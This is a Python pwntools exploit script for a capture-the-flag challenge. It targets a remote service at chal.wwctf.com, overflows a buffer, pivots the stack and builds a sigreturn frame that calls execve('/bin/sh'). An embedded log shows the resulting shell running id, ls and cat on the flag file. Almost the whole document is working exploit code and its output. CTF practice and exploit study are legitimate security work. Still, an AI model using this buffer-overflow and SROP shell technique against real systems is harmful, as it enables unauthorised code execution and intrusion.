
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

#p = process('./main')
p = remote('chal.wwctf.com', 7003)


"""
moe@Ubuntu:~/Documents/WWCTF/grg$ python3 exploit.py 
[+] Opening connection to chal.wwctf.com on port 7003: Done
[+] len SigFrame 0xf8
[*] Switching to interactive mode
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
$ ls
flag.txt
run
$ cat flag.txt
wwf{pr373nd_y0u_4r3_5l33p1n6_50_17_g035_fa5T3r}$ 
[*] Interrupted
[*] Closed connection to chal.wwctf.com port 7003

"""

frame = SigreturnFrame()
frame.rax = 0x3b        # ✓ Correct for execve
frame.rdx = 0           # ← Missing! envp should be 0
frame.rdi = 0x404056    # ✓ Pointer to "/bin/sh"
frame.rsi = 0           # ✓ argv (NULL)
frame.rip = 0x40117c    # ✓ Address of syscall instruction
frame.rsp = 0x404070    # ✓ Stack pointer


main_read = 0x00000000004011a2
plt_read = 0x401050
leave_ret = 0x00000000004011c0
syscall = 0x000000000040117c
bss_50 = 0x404150

print(f"[+] len SigFrame {hex(len(frame))}")

payload_1 = b"a"*(0x100) + p64(bss_50) + p64(main_read)
p.send(payload_1)

payload_2 = b"k"*0 + b"/bin/sh\x00" + p64(plt_read) + p64(syscall) + bytes(frame)[:232] + p64(0x404050) + p64(leave_ret) # p64(0x401050) read@plt

p.send(payload_2 + b"aaaaaa/bin/sh\x00a")


p.interactive()
p.close()
